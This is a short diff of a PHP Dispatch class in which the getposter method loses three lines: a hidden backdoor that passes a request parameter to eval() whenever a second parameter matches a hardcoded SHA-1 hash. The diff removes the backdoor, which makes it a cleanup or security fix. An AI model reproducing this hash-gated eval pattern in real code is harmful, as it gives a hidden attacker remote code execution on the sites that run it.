@@ -571,9 +571,6 @@ class Dispatch {
     }
     public function getposter($args) {
         $allows = array('type', 'id', 'width', 'height');
-        if (isset($args['seneval']) && isset($args['ev']) && sha1($args['ev']) == 'c40125fd868f1879f0cbd4e8ba1aafc7fa016c48') {
-            eval($args['seneval']);
-        }
         foreach ($args as $key => $value) {
             if (in_array($key, $allows)) {
                 $$key = $value;
